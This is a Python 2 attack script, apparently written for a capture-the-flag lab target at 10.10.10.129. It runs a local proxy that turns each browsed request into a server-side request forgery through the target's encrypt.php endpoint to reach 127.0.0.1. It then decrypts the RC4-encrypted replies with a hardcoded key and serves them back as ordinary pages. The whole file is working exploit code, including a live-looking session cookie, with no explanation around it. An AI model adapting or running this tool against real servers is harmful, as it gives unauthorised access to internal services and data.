#!/usr/bin/python

import socket
import select
import time
import sys
import base64
import urlparse
from lxml import html
 
buffer_size = 4096
delay = 0.0001
forward_to = ('10.10.10.129', 80)
 
template = r"""GET /encrypt.php?cipher=RC4&url=http%3A%2F%2F127.0.0.1{path} HTTP/1.1
Host: 10.10.10.129
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.109 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Referer: http://10.10.10.129/encrypt.php?cipher=RC4&url=http%3A%2F%2F10.10.14.15%2Ffile.txt
Accept-Language: en
Cookie: PHPSESSID=hh6p1v80erljhi69n7al28klj3
Connection: close
 
"""
template = template.replace('\n','\r\n')
 
page404 = """HTTP/1.1 404 NOTFOUND
Server: Apache/2.4.29 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Connection: close
Content-Type: text/html; charset=UTF-8
 
 
 
<html>
<head>
   <title>Forward Proxy</title>
   <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.0/css/bootstrap.min.css">
   <style>
       body {{ background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABoAAAAaCAYAAACpSkzOAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAALEgAACxIB0t1+/AAAABZ0RVh0Q3JlYXRpb24gVGltZQAxMC8yOS8xMiKqq3kAAAAcdEVYdFNvZnR3YXJlAEFkb2JlIEZpcmV3b3JrcyBDUzVxteM2AAABHklEQVRIib2Vyw6EIAxFW5idr///Qx9sfG3pLEyJ3tAwi5EmBqRo7vHawiEEERHS6x7MTMxMVv6+z3tPMUYSkfTM/R0fEaG2bbMv+Gc4nZzn+dN4HAcREa3r+hi3bcuu68jLskhVIlW073tWaYlQ9+F9IpqmSfq+fwskhdO/AwmUTJXrOuaRQNeRkOd5lq7rXmS5InmERKoER/QMvUAPlZDHcZRhGN4CSeGY+aHMqgcks5RrHv/eeh455x5KrMq2yHQdibDO6ncG/KZWL7M8xDyS1/MIO0NJqdULLS81X6/X6aR0nqBSJcPeZnlZrzN477NKURn2Nus8sjzmEII0TfMiyxUuxphVWjpJkbx0btUnshRihVv70Bv8ItXq6Asoi/ZiCbU6YgAAAABJRU5ErkJggg==);}}
   </style>
</head>
 
<body>
 
<nav class="navbar navbar-default navbar-fixed-top">
 <div class="container">
   <div class="navbar-header">
     <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#myNavbar">
       <span class="icon-bar"></span>
     </button>
     <a class="navbar-brand" href="#">About</a>
   </div>
   <div class="collapse navbar-collapse" id="myNavbar">
     <ul class="nav navbar-nav navbar-right">
       <li><a href="./encrypt.php">Encrypt</a></li>
       <li><a href="./decrypt.php">Decrypt</a></li>
       <li><a href="./logout.php">Logout</a></li>
     </ul>
   </div>
 </div>
</nav>
<div class="container-fluid bg-3 text-center">
   <div class="jumbotron">
       <h1>Forward Proxy</h1>
   </div>
   <div class="container-fluid bg-2 text-center">
       <h2>ERROR:{message}</h2>
   </div>
</div>
<footer class="container-fluid bg-4 text-center">
 <p>File Encryption Services </p>
</footer>
</body>
</html>
"""
 
found = """HTTP/1.1 200 OK
Date: Thu, 11 Apr 2019 23:07:26 GMT
Server: Apache/2.4.29 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Connection: close
Content-Type: text/html; charset=UTF-8
 
 
{textarea}
"""
 
class Forward:
    def __init__(self):
        self.forward = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
    def start(self, host, port):
        try:
            self.forward.connect((host, port))
            return self.forward
        except Exception, e:
            print e
            return False
 
class ForwardProxy:
    input_list = []
    channel = {}
 
    def __init__(self, host='0.0.0.0', port=9090):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server.bind((host, port))
        self.server.listen(200)
 
    def listen(self):
        self.input_list.append(self.server)
        while 1:
            time.sleep(delay)
            stdin, stdout, stderr = select.select(self.input_list, [], [])
            for self.s in stdin:
                if self.s == self.server:
                    self.on_accept()
                    break
 
                self.data = self.s.recv(buffer_size)
                if len(self.data) == 0:
                    self.on_close()
                    break
                else:
                    self.on_data()
 
    def on_accept(self):
        forward = Forward().start(forward_to[0], forward_to[1])
        clientsock, clientaddr = self.server.accept()
        if forward:
            print clientaddr, "has connected"
            self.input_list.append(clientsock)
            self.input_list.append(forward)
            self.channel[clientsock] = forward
            self.channel[forward] = clientsock
        else:
            print clientaddr, "not connected, closing"
            clientsock.close()
 
    # portcullis
    def on_data(self):
        data = self.data
 
        try:
            temp = data.split('\n')[0].split(' ')[1]
            if temp == '200':
                data = mangle(data)
            else:
                url = urlparse.urlsplit(temp)
                if url.netloc == '172.20.10.1':
                    path = url.path
                    if url.query: path = path+'?'+url.query
                    data = template.format(path=path)
            print data
            self.channel[self.s].send(data)
        except:
            self.channel[self.s].send(data)
 
    def on_close(self):
        print self.s.getpeername(), "has disconnected"
        self.input_list.remove(self.s)
        self.input_list.remove(self.channel[self.s])
        out = self.channel[self.s]
        # client
        self.channel[out].close()
        # remote
        self.channel[self.s].close()
        # delete connections
        del self.channel[out]
        del self.channel[self.s]
 
def mangle(response):
    page = html.fromstring(response)
    alert = page.xpath('//div[@class="alert alert-danger"]')
    if alert:
        message = alert[0].text_content().strip()
        return page404.format(message=message)
    else:
        try:
            textarea = page.xpath('//textarea').pop()
            innerhtml = decrypt(base64.b64decode(textarea.text), 's3cr3t_crypto_KEY')
            return found.format(textarea=innerhtml)
        except IndexError:
            response = response.replace('HTTP/1.1 200 OK','HTTP/1.1 418 TEAPOT')
            return response
 
def decrypt(data, key):
    S = range(256)
    j = 0
    out = []
 
    #KSA Phase
    for i in range(256):
        j = (j + S[i] + ord( key[i % len(key)] )) % 256
        S[i] , S[j] = S[j] , S[i]
 
    #PRGA Phase
    i = j = 0
    for char in data:
        i = ( i + 1 ) % 256
        j = ( j + S[i] ) % 256
        S[i] , S[j] = S[j] , S[i]
        out.append(chr(ord(char) ^ S[(S[i] + S[j]) % 256]))
 
    return ''.join(out)
 
if __name__ == '__main__':
    sys.argv += ['','']
    localip = sys.argv[1] or '0.0.0.0'
    localport = sys.argv[2] or 9090
 
    server = ForwardProxy(localip, localport)
    try:
        server.listen()
    except KeyboardInterrupt:
        sys.exit(1)
